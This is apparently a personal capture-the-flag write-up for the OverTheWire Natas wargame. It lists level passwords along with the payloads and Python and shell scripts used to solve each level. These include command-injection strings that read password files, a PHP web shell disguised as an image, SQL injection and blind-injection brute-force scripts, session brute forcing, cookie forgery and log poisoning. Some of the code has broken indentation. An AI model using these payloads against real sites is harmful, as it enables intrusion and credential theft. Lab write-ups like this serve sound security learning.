# Natas-wu
just a note when i was bored

## Natas0
```
natas0
natas0
```
## Natas2 
```
natas1
0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
```
## Natas2
```
natas2
TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```
## Natas3
```
natas3
3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```
## Natas4
```
robots.txt
natas4
QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
## Natas5
```shell
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org

natas5
0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```
## Natas6
```shell
Cookie: loggedin=1
or
curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -b loggedin=1 http://natas5.natas.labs.overthewire.org/

natas6
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```
## Natas7
```shell
includes/secret.inc
natas7
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```
## Natas8

```shell
index.php?page=/etc/natas_webpass/natas8
natas8
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```
## Natas9
```php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($encoded) {
    return base64_decode(strrev(hex2bin($encoded)));
}

echo decodeSecret($encodedSecret);
?>
oubWYf2kBq
```
```
natas9
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```
## Natas10
```shell
;ls -la;
;cat /etc/natas_webpass/natas8;
natas10
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```
## Natas11
- BAN || && ;
```shell 
-> try &(ls) -> idk but not exec
-> .* # -> grep -i .* # -> cat exec
-> `.* /etc/natas_webpass/natas11 #
natas11
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
## Natas12
```python
import base64
import json
import urllib.parse

encoded_cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D"
decoded_cookie = base64.b64decode(urllib.parse.unquote(encoded_cookie)).decode(errors="ignore")

default_data = json.dumps({"showpassword": "no", "bgcolor": "#ffffff"})
key = "".join(chr(ord(c) ^ ord(d)) for c, d in zip(decoded_cookie, default_data))[:4]

new_data = json.dumps({"showpassword": "yes", "bgcolor": "#ffffff"})
new_cookie = base64.b64encode("".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(new_data)).encode()).decode()

```
```
natas12
yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```
## Natas13
```shell
upload file trigger .php -> whell shell
RCE cat cat /etc/natas_webpass/natas13;
natas13
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```
## Natas14
```shell
bypass file header image 
echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > image.php
natas14
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
## Natas15
```shell
username=1"+OR+"1"+%3d+"1"+%23&password=a
natas15
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```
## Natas16
- Boolean SQLi
```shell
- TRUE = This user exists.
- FASLE = This user doesn't exist.
```
- Step1 findstr Length
- Step2 BF with Binary Search
```python
import requests

burp0_url = "http://natas15.natas.labs.overthewire.org/index.php"
burp0_headers = {
    "Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
}

def sqli(pos, mid):
    payload = f'natas16" AND ascii(substr(password,{pos},1))<={mid}#'
    burp0_data = {"username": payload}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return "This user exists." in r.text
    
def find_pass_length():
	for i in range(1, 100):
	    burp0_data = {"username": f'natas16" AND length(password)={i}#'}
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        if "This user exists." in r.text:
            print(f"✅ Password Length: {i}")
            return i
    return 32

def get_char(pos):
    lo, hi = 32, 128
    while lo < hi:
        mid = (lo + hi) // 2
        if sqli(pos, mid):
            hi = mid
        else:
            lo = mid + 1
    return chr(lo)
    
def find_pass_content():
    password = ""
    pass_length = find_pass_length()
    for i in range(1, pass_length + 1):
        password += get_char(i)
        print(f"🔍 Password: {password}", end="\r", flush=True)
      print(f"\n✅ Password found: {password}")

find_pass_content()
```
## Natas17 

- This is blind OS cmd injection
- Server not render result when we inject an OS cmd
- I will try with $(sleep 10)
```python
needle=%24%28sleep+10s%29
```

- I have a atkack vector with grep cmd and behavior of server
```shell
$(grep ^(pass_char) /etc/natas_webpass/natas17)
```
- this cmd will check string start with pass_char in file -> i can brute fore
```shell
$(grep ^(pass_char) /etc/natas_webpass/natas17)cools
```
- if cools not in reponse -> i found a char in pass

```python
import requests
burp0_headers = {

    "Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
}

filteredchars = ''
password = ''
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

for x in range(32):
    for char in allchars:
        injection = password + char
        url = f"http://natas16.natas.labs.overthewire.org/?needle=$(grep ^{injection} /etc/natas_webpass/natas17)cools"
        rq = requests.get(url, headers=burp0_headers)
        if 'cools' not in rq.text:
            password += char
            print(password)
            break
#EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```
## Natas18

- SQL timebase
```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```
## Natas19
- PHPSESSID(1,640) -> can bf 
```
import requests

  

url = "http://natas18.natas.labs.overthewire.org/"

auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

  

for i in range(1, 641):

    cookies = {'PHPSESSID': str(i)}

    r = requests.get(url, auth=auth, cookies=cookies)

  

    if "You are an admin" in r.text:

        print(f"[+] Found admin session ID: {i}")

        print(r.text)

        break
```
```
natas19
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```
## Natas20
- PHPSESSID = 3135312d61 => bytes.fromhex("3135312d61").decode() # Output: '151-a'

```
import requests

  

url = "http://natas19.natas.labs.overthewire.org/"

auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

  

for i in range(1, 641):

    session_raw = f"{i}-admin"

    session_hex = session_raw.encode().hex()

  

    cookies = {'PHPSESSID': session_hex}

    r = requests.get(url, auth=auth, cookies=cookies)

  

    if "You are an admin" in r.text:

        print(f"[+] Found admin session at ID = {i}")

        print(r.text)

        break
```
```
natas20
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```
## Natas21
- wtf is this session handle ? 
- 2 line -> bypass
```python
import requests

  

url = 'http://natas20.natas.labs.overthewire.org/'

auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

session = requests.Session()

session.auth = auth

payload = 'admin\nadmin 1'

session.post(url, data={'name': payload})

  

res = session.get(url)

print(res.text)
```

```
natas21
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```
## Natas22
- get PHPSESSION = hint 
- get flag
```shell 
#!/bin/bash

  

#get PHPSESSID

PHPSESSID=$(curl -s -i -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH \

  -X POST \

  -d "admin=1&submit=1" \

  http://natas21-experimenter.natas.labs.overthewire.org/index.php \

  | grep -oP 'PHPSESSID=\K[^;]+')

  

echo "[+] Got PHPSESSID: $PHPSESSID"

# GET flag

curl -s -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH \

  --cookie "PHPSESSID=$PHPSESSID" \

  http://natas21.natas.labs.overthewire.org/
```
```
Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```
## Natas23
```shell
 curl -i -s -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz \
  "http://natas22.natas.labs.overthewire.org/?revelio=true"
```
```
	natas23
	dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```
## Natas24
- PHP type juggling strstr -> 111111111iloveyou -> iloveyou 
```
curl -s -G -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs \
  --data-urlencode "passwd=111111iloveyou" \
  http://natas23.natas.labs.overthewire.org/
```
```
natas24
MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```
## Natas25
```
passwd[]
```
```
natas25
ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```
## Natas 26
```python
#!/usr/bin/env python

import requests

target = 'http://natas25.natas.labs.overthewire.org'
auth = ('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')

cookies = dict()
# this forces the application to call logRequest() function
params = dict(lang='natas_webpass')
# this put contents of "/etc/natas_webpass/natas26" in each log entry
headers = {
	"User-Agent": '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
}

# executes a first request to get the session id
r = requests.get(target, auth=auth, params=params, cookies=cookies, headers=headers)
phpsessid=r.cookies['PHPSESSID']
log_file = '....//....//....//....//....//var/www/natas/natas25/logs/natas25_%s.log' % phpsessid
cookies = dict(PHPSESSID=phpsessid)

# "..././" is escaped to "../", we'll exploit it reach log_file
params = dict(lang=log_file)
r = requests.get(target, auth=auth, params=params, cookies=cookies, headers=headers)
print(r.text)
```
